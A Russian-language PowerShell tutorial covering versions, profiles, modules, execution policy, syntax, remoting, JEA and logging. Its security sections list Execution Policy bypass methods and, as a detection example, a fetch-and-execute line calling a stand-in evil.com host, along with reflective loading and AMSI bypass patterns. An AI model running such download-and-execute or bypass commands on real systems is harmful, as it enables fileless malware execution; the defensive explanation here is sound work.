---
title: "Windows - PowerShell: скриптинг и автоматизация"
date: "2026-05-13"
---

PowerShell - это не просто командная строка. Это полноценная объектно-ориентированная оболочка и язык программирования, встроенный в Windows. В отличие от cmd, который передаёт текст, PowerShell передаёт объекты - структурированные данные со свойствами и методами. Это меняет всё: не нужно парсить вывод регулярками, можно напрямую обращаться к нужному полю.

---

## Что такое PowerShell и где он живёт

### Два разных PowerShell

```
На современном Windows вы можете встретить две версии:

Windows PowerShell (встроенный, legacy)
  Версии: 1.0 → 2.0 → 3.0 → 4.0 → 5.0 → 5.1 (последняя)
  Движок: .NET Framework (только Windows)
  Исполняемый файл:
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe   (64-bit)
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe   (32-bit)
  Статус: заморожен, Microsoft больше не развивает

PowerShell (новый, кроссплатформенный)
  Версии: 6.x → 7.0 → 7.1 → 7.2 → 7.3 → 7.4 → 7.5 (активная разработка)
  Движок: .NET (Core) - работает на Windows, Linux, macOS
  Устанавливается отдельно, не заменяет встроенный
  Исполняемый файл (после установки):
    C:\Program Files\PowerShell\7\pwsh.exe
  Статус: активная разработка, рекомендуется для новых проектов

Как проверить версию:
  $PSVersionTable   - показывает полную информацию о среде
  $PSVersionTable.PSVersion.Major   - только основная версия
```

```
Почему это важно:
- Модули написанные для Windows PowerShell 5.1 могут не работать в PS 7
  (если используют Windows-специфичные .NET API)
- AD модуль (ActiveDirectory) работает только в Windows PowerShell 5.1
  (или через compatibility shim в PS 7)
- На серверах без установленного PS 7 доступен только 5.1
- В скриптах безопасности чаще встречается 5.1, потому что он везде есть
```

### Профили PowerShell

```
Профиль - это скрипт, который автоматически выполняется при запуске
каждой новой сессии PowerShell. Аналог .bashrc в Linux.

Переменная $PROFILE содержит путь к профилю текущего пользователя.
Существует несколько уровней профилей (от более специфичного к общему):

$PROFILE.CurrentUserCurrentHost    - текущий пользователь, текущий хост (PS/ISE/VSCode)
  Путь: C:\Users\alice\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1

$PROFILE.CurrentUserAllHosts       - текущий пользователь, все хосты
  Путь: C:\Users\alice\Documents\WindowsPowerShell\profile.ps1

$PROFILE.AllUsersCurrentHost       - все пользователи, текущий хост
  Путь: C:\Windows\System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1

$PROFILE.AllUsersAllHosts          - все пользователи, все хосты
  Путь: C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1

Если файл профиля не существует - ничего не происходит, это нормально.
$PROFILE просто показывает путь, но файл может отсутствовать.

С точки зрения безопасности: атакующие могут добавить код в профиль
для persistence. При расследовании инцидентов - смотреть все профили.
```

### Где хранятся модули

```
Модуль - это пакет функций, командлетов, провайдеров и других ресурсов.
Команда Get-Module -ListAvailable показывает все доступные модули.

Пути поиска модулей хранятся в переменной $env:PSModulePath
(аналог PATH для исполняемых файлов, но для модулей)

Типичные пути (разделены точкой с запятой):
  C:\Users\alice\Documents\WindowsPowerShell\Modules       ← пользовательские модули
  C:\Program Files\WindowsPowerShell\Modules               ← системные (для всех)
  C:\Windows\System32\WindowsPowerShell\v1.0\Modules       ← встроенные модули Windows
  C:\Program Files (x86)\...                               ← 32-bit приложения

Встроенные модули Windows (примеры):
  Microsoft.PowerShell.Management    - Get-ChildItem, Get-Process, Get-Service...
  Microsoft.PowerShell.Security      - Get-Acl, ConvertTo-SecureString...
  Microsoft.PowerShell.Utility       - Write-Output, Format-Table, Measure-Object...
  Microsoft.PowerShell.Diagnostics   - Get-WinEvent, Get-EventLog
  ActiveDirectory                    - Get-ADUser, New-ADGroup... (через RSAT)
  NetTCPIP                           - Get-NetIPAddress, Test-NetConnection
  ServerManager                      - Install-WindowsFeature

Структура папки модуля:
  C:\...\Modules\
  └── MyModule\
      ├── MyModule.psd1    ← манифест модуля (метаданные)
      ├── MyModule.psm1    ← основной файл с функциями
      └── en-US\
          └── MyModule.dll-Help.xml  ← справка
```

---

## Execution Policy - политика выполнения скриптов

```
Execution Policy - это НЕ система безопасности. Это мера защиты от
случайного запуска скриптов. Любой кто хочет обойти её - обойдёт.

Политики (от самой строгой к самой мягкой):

Restricted       - запрещено всё (скрипты .ps1 не запускаются)
                   Это дефолт для клиентских Windows
                   Интерактивные команды в консоли работают нормально

AllSigned        - только скрипты с цифровой подписью доверенного издателя

RemoteSigned     - локальные скрипты - без подписи
                   скрипты из интернета (ZoneIdentifier ADS метка) - нужна подпись
                   Это дефолт для серверных Windows

Unrestricted     - всё разрешено, но предупреждение для интернет-скриптов

Bypass           - всё разрешено, без предупреждений
                   Используется в автоматизации, CI/CD

Undefined        - политика не задана на этом уровне, применяется следующий уровень

Уровни применения политики (от приоритетного к менее приоритетному):
  MachinePolicy    - из GPO (Computer Configuration) - переопределить нельзя
  UserPolicy       - из GPO (User Configuration)
  Process          - для текущего процесса PowerShell (-ExecutionPolicy при запуске)
  CurrentUser      - в реестре: HKCU\Software\Microsoft\PowerShell\...
  LocalMachine     - в реестре: HKLM\Software\Microsoft\PowerShell\...

Хранение в реестре:
  HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\
    ExecutionPolicy = RemoteSigned

  HKCU\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\
    ExecutionPolicy = Unrestricted
```

```
Почему Execution Policy не является настоящей защитой:

1. Запуск с параметром:
   powershell.exe -ExecutionPolicy Bypass -File script.ps1

2. Передача скрипта через stdin:
   Get-Content script.ps1 | powershell.exe -

3. Encode в Base64:
   powershell.exe -EncodedCommand <base64 строка>

4. Через .NET напрямую:
   [System.Management.Automation.PowerShell]::Create().AddScript("...").Invoke()

5. Через WMIC или другие лончеры

Настоящая защита скриптов - это Script Block Logging (логирование),
AppLocker / WDAC (белый список), и мониторинг аномальных запусков.
```

---

## Как PowerShell находит и запускает команды

### Порядок разрешения имён команд

```
Когда вы вводите команду, PowerShell ищет её в следующем порядке:

1. Alias          - псевдонимы (ls → Get-ChildItem, cat → Get-Content)
2. Function        - функции определённые в текущей сессии или профиле
3. Cmdlet          - встроенные командлеты (.NET классы)
4. External script - .ps1 файл в $env:PATH или с явным путём
5. Application     - .exe, .cmd, .bat в $env:PATH

Если имя совпадает с несколькими - берётся первое по приоритету.
Если хочешь явно указать тип - используй & (call operator) или путь:
  & "C:\scripts\tool.exe"
  & ".\myscript.ps1"
```

### Pipeline - конвейер объектов

```
Самая важная концепция PowerShell - pipeline (|).

В cmd: команды передают ТЕКСТ
  dir | find "exe"
  → find разбирает текст построчно регуляркой

В PowerShell: команды передают ОБЪЕКТЫ
  Get-Process | Where-Object { $_.CPU -gt 100 }
  → Where-Object получает объекты Process и фильтрует по свойству CPU

Это означает:
  - Не нужно парсить текст регулярками
  - Можно обращаться к любому свойству объекта по имени
  - Объекты сохраняют тип данных (число остаётся числом, дата - датой)

$_ (или $PSItem) - автоматическая переменная, означает "текущий объект в pipeline"
```

### Cmdlet - структура именования

```
Все cmdlet следуют соглашению: Глагол-Существительное

Основные глаголы:
  Get-     получить информацию (Get-Process, Get-ADUser, Get-Service)
  Set-     изменить существующее (Set-ADUser, Set-Service)
  New-     создать новое (New-ADUser, New-Item, New-PSSession)
  Remove-  удалить (Remove-ADUser, Remove-Item)
  Add-     добавить к существующему (Add-ADGroupMember, Add-Content)
  Enable-  включить (Enable-ADAccount, Enable-PSRemoting)
  Disable- выключить (Disable-ADAccount)
  Start-   запустить (Start-Service, Start-Process, Start-Job)
  Stop-    остановить (Stop-Service, Stop-Process)
  Import-  импортировать данные (Import-Csv, Import-Module)
  Export-  экспортировать (Export-Csv, Export-Clixml)
  Test-    проверить без изменений (Test-NetConnection, Test-Path)
  Invoke-  выполнить действие (Invoke-Command, Invoke-RestMethod)
  Convert- преобразовать формат (ConvertTo-Json, ConvertFrom-Csv)
  Format-  форматировать вывод (Format-Table, Format-List, Format-Wide)

Посмотреть все доступные глаголы: Get-Verb
Найти cmdlet по части имени: Get-Command *process*
Найти cmdlet по глаголу: Get-Command -Verb Get -Noun *AD*
```

---

## Типы данных и переменные

### Переменные

```
Переменные начинаются с символа $
Имена чувствительны к регистру? НЕТ - $Name = $name = $NAME

$myVar = "hello"          # строка
$count = 42               # целое число
$pi = 3.14                # число с плавающей точкой
$isTrue = $true           # булево значение ($true / $false)
$nothing = $null          # null (отсутствие значения)
$arr = @(1, 2, 3)         # массив
$hash = @{ Key = "Val" }  # хеш-таблица (словарь)

Тип переменной определяется автоматически, но можно указать явно:
[int]$count = "42"        # принудительно int, "42" преобразуется
[string]$name = 100       # принудительно string, 100 становится "100"
[datetime]$date = "2026-01-01"  # парсит строку в дату

Специальные автоматические переменные:
  $null       - null значение
  $true       - True
  $false      - False
  $_          - текущий объект в pipeline
  $args       - массив аргументов в функции без param()
  $error      - массив последних ошибок (последняя: $error[0])
  $?          - True если последняя команда выполнилась успешно
  $LASTEXITCODE - код выхода последней внешней программы (0 = успех)
  $PSScriptRoot - директория, в которой лежит текущий .ps1 файл
  $MyInvocation - информация о текущей команде/скрипте
  $env:PATH     - переменная окружения PATH (через $env:ИМЯ)
```

### Строки

```
PowerShell имеет два типа строк:

Одинарные кавычки: '...'
  - Строка буквальная, никаких подстановок
  - $name в одинарных кавычках - это текст "$name", не значение переменной
  - Используй когда нужно передать текст as-is

Двойные кавычки: "..."
  - Переменные подставляются (interpolation)
  - "Hello $name" → "Hello alice"
  - Выражения в $(...): "Файлов: $(Get-ChildItem | Measure-Object).Count)"
  - Спецсимволы: `n (newline), `t (tab), `$ (буквальный $), `" (кавычка внутри)

Here-String (многострочные строки):
  @"
  Это многострочная строка
  $name - подставится
  "@                                 ← закрывающий тег ДОЛЖЕН быть на новой строке без пробелов

  @'
  Это многострочная строка
  $name - НЕ подставится
  '@
```

### Массивы и хеш-таблицы

```
Массив - упорядоченная коллекция объектов:
  $arr = @(1, "два", $true, (Get-Date))  # разные типы - ок
  $arr[0]       # первый элемент = 1
  $arr[-1]      # последний элемент
  $arr[1..3]    # срез с 1 по 3
  $arr.Count    # количество элементов
  $arr += 5     # добавить элемент (создаёт новый массив!)

Хеш-таблица - ключ-значение (неупорядоченный словарь):
  $hash = @{
      Name = "alice"
      Age  = 30
      City = "Moscow"
  }
  $hash["Name"]    # "alice"
  $hash.Name       # то же самое, через точку
  $hash.Keys       # все ключи
  $hash.Values     # все значения
  $hash["Email"] = "alice@corp.com"   # добавить или изменить

Упорядоченный словарь (порядок вставки сохраняется):
  $ordered = [ordered]@{ First = 1; Second = 2; Third = 3 }
```

---

## Управление потоком

### Условия

```
if / elseif / else:
  if ($x -gt 10) {
      "больше 10"
  } elseif ($x -eq 10) {
      "равно 10"
  } else {
      "меньше 10"
  }

Операторы сравнения (НЕ < > = как в других языках!):
  -eq   равно              (equal)
  -ne   не равно           (not equal)
  -gt   больше             (greater than)
  -lt   меньше             (less than)
  -ge   больше или равно   (greater or equal)
  -le   меньше или равно   (less or equal)
  -like  совпадение с wildcard ("alice*")
  -match совпадение с регуляркой
  -contains  массив содержит значение
  -in        значение входит в массив (reverse contains)
  -not       логическое НЕ   (или !)
  -and       логическое И
  -or        логическое ИЛИ

По умолчанию операторы регистронезависимы.
Для чувствительного к регистру варианта: -ceq, -clike, -cmatch
```

### Циклы

```
foreach (самый частый в скриптах):
  foreach ($user in $users) {
      Write-Host "Обрабатываю $($user.Name)"
  }

ForEach-Object (в pipeline):
  $users | ForEach-Object { Write-Host $_.Name }

for (классический цикл со счётчиком):
  for ($i = 0; $i -lt 10; $i++) {
      Write-Host "Итерация $i"
  }

while:
  while ($running) {
      Start-Sleep 1
      $running = Test-Connection -ComputerName server -Quiet
  }

do-while / do-until:
  do {
      $input = Read-Host "Введите Y для продолжения"
  } while ($input -ne "Y")

break   - прервать цикл
continue - перейти к следующей итерации
```

---

## Функции и скрипты

### Функции

```
Функции - многоразовые блоки кода.

Простая функция:
  function Say-Hello {
      param([string]$Name = "World")
      Write-Output "Hello, $Name!"
  }
  Say-Hello -Name "Alice"   # вызов
  Say-Hello "Alice"          # позиционный параметр

Продвинутая функция (с атрибутами):
  function Get-UserReport {
      [CmdletBinding()]    # делает функцию "advanced" - появляется -Verbose, -WhatIf и др.
      param(
          [Parameter(Mandatory)]         # обязательный параметр
          [string]$Username,

          [Parameter()]
          [ValidateSet("Short","Full")]  # только эти значения
          [string]$ReportType = "Short",

          [switch]$IncludeDisabled       # переключатель: -IncludeDisabled = $true
      )

      # тело функции
      $user = Get-ADUser $Username -Properties *
      if (-not $user) {
          Write-Error "Пользователь $Username не найден"
          return
      }
      # ...
  }
```

### Структура .ps1 скрипта

```
Типичная структура хорошо написанного скрипта:

#Requires -Version 5.1                     # минимальная версия PowerShell
#Requires -Modules ActiveDirectory         # требуемые модули
#Requires -RunAsAdministrator              # требует запуска от админа

<#
.SYNOPSIS
    Краткое описание что делает скрипт.
.DESCRIPTION
    Подробное описание. Появляется в Get-Help.
.PARAMETER Username
    Описание параметра.
.EXAMPLE
    .\script.ps1 -Username alice.smith
.NOTES
    Автор: John Doe
    Дата: 2026-05-12
#>

[CmdletBinding(SupportsShouldProcess)]   # поддержка -WhatIf и -Confirm
param(
    [Parameter(Mandatory, HelpMessage="Введите имя пользователя")]
    [string]$Username,

    [string]$OutputPath = "C:\Reports"
)

Set-StrictMode -Version Latest   # ошибка при обращении к несуществующей переменной
$ErrorActionPreference = "Stop"  # любая ошибка = исключение (удобно в скриптах)

# --- Основной код ---

function Main {
    Write-Verbose "Запуск скрипта для пользователя $Username"
    # ...
}

Main
```

### Где хранить скрипты

```
Нет единого стандарта, но распространённые практики:

Локальные скрипты:
  C:\Scripts\                      # системные скрипты (все пользователи)
  C:\Users\alice\Scripts\          # скрипты конкретного пользователя

Корпоративные скрипты:
  \\fileserver\Scripts\            # сетевая шара (но Execution Policy может блокировать!)
  Задачи планировщика обычно запускают из C:\Scripts\ - без сетевых зависимостей

Автозапуск через GPO:
  Startup Scripts:  Computer Configuration → Windows Settings → Scripts → Startup
    \\domain.com\SYSVOL\domain.com\Policies\{GUID}\Machine\Scripts\Startup\
  Logon Scripts:   User Configuration → Windows Settings → Scripts → Logon
    \\domain.com\SYSVOL\domain.com\Policies\{GUID}\User\Scripts\Logon\

Scheduled Tasks (наиболее гибко):
  powershell.exe -ExecutionPolicy Bypass -NonInteractive -File "C:\Scripts\myjob.ps1"
  pwsh.exe -NonInteractive -File "C:\Scripts\myjob.ps1"
```

---

## Обработка ошибок

### Потоки вывода PowerShell

```
PowerShell имеет 6 потоков вывода (в отличие от cmd где только stdout/stderr):

Stream 1: Output (Success)   - результат команды, передаётся по pipeline
Stream 2: Error              - ошибки (Write-Error, исключения)
Stream 3: Warning            - предупреждения (Write-Warning)
Stream 4: Verbose            - подробная информация (Write-Verbose)
                               Видна только при -Verbose или $VerbosePreference = "Continue"
Stream 5: Debug              - отладочная информация (Write-Debug)
                               Видна только при -Debug или $DebugPreference = "Continue"
Stream 6: Information        - информационные сообщения (Write-Information, Write-Host)

Перенаправление потоков:
  command 2>&1          # stderr в stdout (как в bash)
  command *>&1          # все потоки в stdout
  command 2>errors.txt  # поток ошибок в файл
  command 6>info.txt    # поток информации в файл

Write-Host vs Write-Output:
  Write-Host   - пишет напрямую на экран, МИНУЕТ pipeline
                 Используй для сообщений пользователю, не для данных
  Write-Output - отправляет в pipeline (поток 1)
                 Это "возвращаемое значение" функции/скрипта
```

### Типы ошибок и ErrorActionPreference

```
В PowerShell ошибки бывают двух видов:

Terminating Error (прерывающая):
  - Полностью останавливает выполнение командлета
  - Генерируется через throw или Write-Error с -ErrorAction Stop
  - Перехватывается через try/catch

Non-terminating Error (непрерывающая):
  - Записывается в $error и выводится, но выполнение продолжается
  - Большинство ошибок командлетов по умолчанию - непрерывающие
  - "Файл не найден" при Get-Item = непрерывающая ошибка

$ErrorActionPreference - глобальная настройка обработки ошибок:
  Continue      - показать ошибку и продолжить (дефолт в интерактивной сессии)
  Stop          - превратить любую ошибку в исключение (лучший вариант для скриптов)
  SilentlyContinue - подавить ошибку и продолжить (используй осторожно)
  Inquire       - спрашивать что делать при каждой ошибке

Для отдельной команды: -ErrorAction Stop/Continue/SilentlyContinue
  Get-Item "C:\nonexistent" -ErrorAction SilentlyContinue   # не покажет ошибку
  Get-Item "C:\nonexistent" -ErrorAction Stop                # бросит исключение
```

### Try / Catch / Finally

```
try {
    # код который может бросить исключение
    $result = Get-ADUser "alice" -ErrorAction Stop
    Write-Output "Найден: $($result.Name)"
}
catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
    # ловим конкретный тип исключения
    Write-Warning "Пользователь не найден: $_"
}
catch {
    # ловим любое исключение
    Write-Error "Неожиданная ошибка: $($_.Exception.Message)"
    Write-Error "Тип исключения: $($_.Exception.GetType().FullName)"
    # $_ внутри catch = объект ErrorRecord
}
finally {
    # выполняется ВСЕГДА - и при успехе, и при ошибке
    # хорошо для cleanup: закрыть соединения, удалить временные файлы
    Write-Verbose "Блок finally выполнен"
}
```

---

## Remoting - удалённое выполнение

### Как работает WinRM

```
WinRM (Windows Remote Management) - это протокол и служба,
которая обеспечивает удалённое выполнение PowerShell команд.

Основан на протоколе WS-Management (веб-сервис поверх HTTP/HTTPS).

Транспорт:
  HTTP:  порт 5985 (данные шифруются на уровне протокола, не TLS)
  HTTPS: порт 5986 (TLS шифрование, нужен сертификат)

Аутентификация:
  Kerberos   - дефолт в домене (без передачи пароля по сети)
  NTLM       - когда Kerberos недоступен
  Basic      - имя/пароль в base64 (только через HTTPS!)
  CredSSP    - делегирование credentials на удалённый хост (Double-hop solution)
  Certificate - клиентский сертификат

Что нужно для работы:
  На удалённой машине: Enable-PSRemoting (запускает службу WinRM, настраивает firewall)
  В домене: GPO обычно уже включает WinRM на серверах
  Firewall: входящее правило "Windows Remote Management (HTTP-In)"
```

```
Два способа удалённого выполнения:

Invoke-Command (без создания постоянной сессии):
  Invoke-Command -ComputerName SERVER01 -ScriptBlock { Get-Service }
  Один запрос - один ответ, соединение закрывается
  Хорошо для одиночных команд или небольших скриптов

PSSession (постоянная сессия):
  $session = New-PSSession -ComputerName SERVER01
  Invoke-Command -Session $session -ScriptBlock { $data = Get-Process }
  Invoke-Command -Session $session -ScriptBlock { $data | Format-Table }  # $data сохранена!
  Remove-PSSession $session
  Хорошо когда нужно несколько запросов, переменные сохраняются между вызовами
```

### Double-Hop проблема

```
Double-Hop - классическая проблема при удалённом выполнении.

Проблема:
  Ты на WKS001 подключаешься к SERVER01 через Remoting.
  Из сессии на SERVER01 пытаешься обратиться к \\FILESERVER\share.
  Получаешь "Access Denied".

Почему:
  Kerberos билет WKS001→SERVER01 - это impersonation token.
  Его нельзя использовать для следующего прыжка WKS001→SERVER01→FILESERVER.
  Credentials не делегируются автоматически.

Решения:

1. CredSSP (наиболее простое, но снижает безопасность):
   Credentials физически передаются на SERVER01 и хранятся в памяти.
   Это риск: если SERVER01 скомпрометирован - credentials украдут.
   Enable-WSManCredSSP -Role Client -DelegateComputer SERVER01  # на клиенте
   Enable-WSManCredSSP -Role Server                             # на SERVER01

2. Kerberos Constrained Delegation (правильный способ в домене):
   В AD настраивается: SERVER01 может делегировать credentials к FILESERVER.
   Настраивается администратором AD на объекте-компьютере SERVER01.
   Не требует передачи credentials.

3. Явная передача credentials в Invoke-Command:
   $cred = Get-Credential
   Invoke-Command -ComputerName FILESERVER -Credential $cred { ... }
   Работает, но credentials нужно хранить/передавать.

4. Just Enough Administration (JEA):
   Создать endpoint с виртуальным аккаунтом, который уже имеет доступ к FILESERVER.
```

---

## Модули и пакетный менеджер

### PowerShell Gallery и PSRepository

```
PowerShell Gallery - официальный репозиторий модулей и скриптов.
Адрес: https://www.powershellgallery.com
Аналог npm для Node.js или pip для Python.

Команды работы с Gallery:
  Find-Module Az                      # найти модуль
  Install-Module Az                   # установить
  Update-Module Az                    # обновить
  Uninstall-Module Az                 # удалить
  Get-InstalledModule                 # список установленных

Куда устанавливаются модули:
  Install-Module ModuleName -Scope AllUsers
    → C:\Program Files\WindowsPowerShell\Modules\ModuleName\

  Install-Module ModuleName -Scope CurrentUser
    → C:\Users\alice\Documents\WindowsPowerShell\Modules\ModuleName\

Работа без интернета (внутренний репозиторий):
  Register-PSRepository - зарегистрировать внутренний репозиторий
  NuGet сервер или папка с пакетами (.nupkg файлы)

Популярные модули из Gallery:
  Az              - Azure PowerShell
  MSOnline        - Microsoft 365 (устарел, но используется)
  Microsoft.Graph - Microsoft Graph API
  Pester          - фреймворк для тестирования PowerShell кода
  PSWindowsUpdate - управление Windows Update
  ImportExcel     - работа с Excel без установки Office
```

### Создание своего модуля

```
Минимальный модуль состоит из двух файлов:

1. MyModule.psm1 - файл с кодом:
   function Get-MyData {
       param([string]$Name)
       return "Data for $Name"
   }

   function Set-MyConfig {
       # ...
   }

   Export-ModuleMember -Function Get-MyData, Set-MyConfig
   # Явно указываем что экспортировать (что будет видно снаружи)

2. MyModule.psd1 - манифест (создаётся командой New-ModuleManifest):
   @{
       ModuleVersion   = '1.0.0'
       Author          = 'John Doe'
       Description     = 'Мой модуль'
       RootModule      = 'MyModule.psm1'
       FunctionsToExport = @('Get-MyData', 'Set-MyConfig')
       RequiredModules = @('ActiveDirectory')
   }

Разместить папку MyModule\ в одном из путей $env:PSModulePath
→ модуль автоматически доступен через Import-Module MyModule
```

---

## Безопасность PowerShell

### Script Block Logging

```
Script Block Logging - логирование всего кода PowerShell который выполняется.
Это мощный инструмент обнаружения атак.

Без Script Block Logging:
  Видно только запуск powershell.exe с параметрами (из Process Creation 4688)
  Содержимое obfuscated/encoded скрипта - не видно

С Script Block Logging:
  Содержимое КАЖДОГО выполненного блока кода записывается в Event Log
  Даже если код был obfuscated или encoded - PowerShell его декодирует
  перед выполнением, и декодированная версия пишется в лог

Где смотреть:
  Event Log: Microsoft-Windows-PowerShell/Operational
  Event ID 4104 - Script Block Logging (Script block compiled)

Включение через GPO:
  Computer Configuration → Administrative Templates →
  Windows Components → Windows PowerShell
  → "Turn on PowerShell Script Block Logging" = Enabled

Реестр:
  HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\
    EnableScriptBlockLogging = 1
    EnableScriptBlockInvocationLogging = 1  (логировать каждый вызов, не только компиляцию)

Важно: очень подробное логирование. На busy системе будет много событий.
```

### Constrained Language Mode

```
Constrained Language Mode (CLM) - режим ограниченного языка PowerShell.
Блокирует опасные возможности языка.

В CLM запрещено:
  - Обращение к .NET типам напрямую ([System.Reflection.Assembly]::Load...)
  - COM объекты (New-Object -ComObject ...)
  - Add-Type (компиляция C# кода в памяти)
  - Большинство способов обойти ограничения безопасности

CLM включается автоматически при:
  - AppLocker политике (если настроена)
  - Windows Defender Application Control (WDAC)
  - Device Guard

Проверить текущий языковый режим:
  $ExecutionContext.SessionState.LanguageMode
  Результат: FullLanguage / ConstrainedLanguage / RestrictedLanguage / NoLanguage

Это реальная защита (в отличие от Execution Policy).
```

### Опасные паттерны (с точки зрения Blue Team)

```
При мониторинге PowerShell обращать внимание на:

EncodedCommand / -enc:
  powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALi4u
  Обычное использование: почти никогда
  Подозрительное: почти всегда - обфускация команды

IEX (Invoke-Expression) + DownloadString:
  IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
  Классический fileless malware паттерн
  Загружает и сразу выполняет код из интернета

Reflection / Assembly Loading:
  [System.Reflection.Assembly]::LoadWithPartialName(...)
  [System.Reflection.Assembly]::Load([Convert]::FromBase64String(...))
  Загрузка .NET сборок в обход AppLocker

AMSI Bypass паттерны:
  AMSI (Antimalware Scan Interface) - Windows API для сканирования скриптов антивирусом
  Атакующие пытаются его отключить/обойти через патчинг памяти или рефлексию

PowerShell Remoting без GUI:
  powershell -NonInteractive -WindowStyle Hidden
  Скрипт работает в фоне, нет UI - признак автоматизированной атаки

Загрузка из нестандартных мест:
  C:\Users\*\AppData\Local\Temp\
  C:\ProgramData\
  Пути содержащие random GUID имена
```

---

## Just Enough Administration (JEA)

```
JEA - механизм ограничения административных привилегий через
специально настроенные PowerShell Remoting endpoint'ы.

Концепция:
  Вместо "дать юзеру права локального Admin" создаётся JEA endpoint.
  Юзер подключается к endpoint через PSSession.
  Endpoint работает от имени виртуального аккаунта (временного локального Admin).
  Но юзер видит только разрешённые командлеты и параметры.

Пример: HelpDesk перезапускает только определённые службы
  Без JEA: нужны права Admin → опасно
  С JEA:   HelpDesk запускает Restart-Service -Name Spooler
           всё остальное заблокировано, виртуальный аккаунт делает реальную работу

Компоненты JEA:
  Role Capability File (.psrc)  - что разрешено делать (командлеты, параметры)
  Session Configuration File (.pssc) - настройки endpoint (кто может подключаться)

Где хранится:
  Role Capabilities:
    C:\Program Files\WindowsPowerShell\Modules\<ModuleName>\RoleCapabilities\*.psrc

  Session Configuration:
    Register-PSSessionConfiguration - регистрирует endpoint
    C:\Windows\System32\wsmprovhost.exe - хост процесс для JEA сессий

Логирование в JEA:
  Все JEA сессии можно логировать в transcript файлы
  Видно всё что делал пользователь, от чьего имени выполнялось
```

---

## Практические сценарии

### Что происходит при запуске скрипта

```
1. powershell.exe запускается как новый процесс
2. PowerShell загружает профиль (если есть и не указан -NoProfile)
3. Проверяется Execution Policy
4. Если скрипт загружен из интернета (ADS метка Zone.Identifier) -
   проверяется RemoteSigned политика
5. Скрипт компилируется в ScriptBlock
6. Если включён Script Block Logging - ScriptBlock пишется в Event 4104
7. Если включён AMSI - содержимое передаётся антивирусу на проверку
8. Выполнение кода
9. При завершении - $LASTEXITCODE устанавливается в 0 (успех) или != 0 (ошибка)
```

### Автоматизация через Task Scheduler

```
Задачи планировщика - основной способ запуска PowerShell по расписанию.

Лучшие практики:
- Запускать от имени сервисного аккаунта (не от пользователя и не от SYSTEM без необходимости)
- Использовать -ExecutionPolicy Bypass -NonInteractive -NoProfile
  (не зависеть от настроек системы)
- Логировать результаты в файл (скрипт сам пишет лог)
- Хранить скрипт в C:\Scripts\, не в профиле пользователя

Типичная команда в Task Scheduler:
  Program:   powershell.exe
  Arguments: -ExecutionPolicy Bypass -NonInteractive -NoProfile
             -File "C:\Scripts\DailyCleanup.ps1"
             -LogPath "C:\Logs\DailyCleanup.log"

Где смотреть историю выполнения задач:
  Event Log: Microsoft-Windows-TaskScheduler/Operational
  Event 200 - задача запущена
  Event 201 - задача завершена (с кодом выхода)
  Event 202 - задача завершена с ошибкой
```

### Debugging и тестирование скриптов

```
Основные инструменты отладки:

Write-Verbose и -Verbose:
  Добавлять Write-Verbose в ключевых местах скрипта.
  Запускать с -Verbose когда нужно видеть подробный вывод.
  В продакшене -Verbose не указывать - вывод чистый.

Set-PSBreakpoint (встроенный дебаггер):
  Set-PSBreakpoint -Script "C:\script.ps1" -Line 42
  Запустить скрипт → выполнение остановится на строке 42
  Можно смотреть переменные, шагать по строкам

VSCode с расширением PowerShell:
  Лучший способ разработки и отладки скриптов.
  Breakpoints, просмотр переменных, интегрированная консоль.
  Расширение: ms-vscode.PowerShell

Pester - unit тестирование:
  Describe "Get-UserReport" {
      It "Возвращает данные для существующего пользователя" {
          $result = Get-UserReport -Username "alice"
          $result | Should -Not -BeNullOrEmpty
      }
      It "Бросает ошибку для несуществующего пользователя" {
          { Get-UserReport -Username "notexist" } | Should -Throw
      }
  }
```

---

## Шпаргалка

```
ГДЕ ЧТО ЛЕЖИТ
  Исполняемый файл PS 5.1:   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  Исполняемый файл PS 7:     C:\Program Files\PowerShell\7\pwsh.exe
  Профили пользователя:      C:\Users\<user>\Documents\WindowsPowerShell\
  Системные профили:         C:\Windows\System32\WindowsPowerShell\v1.0\
  Встроенные модули:         C:\Windows\System32\WindowsPowerShell\v1.0\Modules\
  Системные модули:          C:\Program Files\WindowsPowerShell\Modules\
  Пользовательские модули:   C:\Users\<user>\Documents\WindowsPowerShell\Modules\
  Execution Policy реестр:   HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell\
  Script Block Logging реестр: HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\

ПОЛЕЗНЫЕ ВСТРОЕННЫЕ ПЕРЕМЕННЫЕ
  $PROFILE          путь к профилю текущего пользователя
  $PSVersionTable   версия и среда PowerShell
  $PSScriptRoot     папка текущего скрипта
  $env:PSModulePath пути поиска модулей
  $error[0]         последняя ошибка
  $?                успех последней команды
  $_                текущий объект в pipeline или catch

КЛЮЧЕВЫЕ КОМАНДЫ ДИАГНОСТИКИ
  Get-Module -ListAvailable        все доступные модули
  Get-Module                       загруженные в текущей сессии
  Get-Command -Module ActiveDirectory  все команды модуля
  Get-ExecutionPolicy -List        политика на всех уровнях
  $PSVersionTable                  версия PowerShell
  Get-PSSessionConfiguration       зарегистрированные JEA/Remoting endpoints

EVENT LOG СОБЫТИЯ POWERSHELL
  Канал: Microsoft-Windows-PowerShell/Operational
  4100  Ошибка выполнения
  4103  Выполнение pipeline
  4104  Script Block Logging (содержимое скрипта)
  4105  Запуск скрипта (старт)
  4106  Завершение скрипта

  Канал: Microsoft-Windows-WinRM/Operational
  6  WSMan session created (входящая Remoting сессия)
  8  WSMan session closed
```

---

## Ссылки

- [PowerShell Documentation](https://learn.microsoft.com/en-us/powershell/) - официальная документация
- [PowerShell Gallery](https://www.powershellgallery.com) - репозиторий модулей
- [About Execution Policies](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies) - детально про Execution Policy
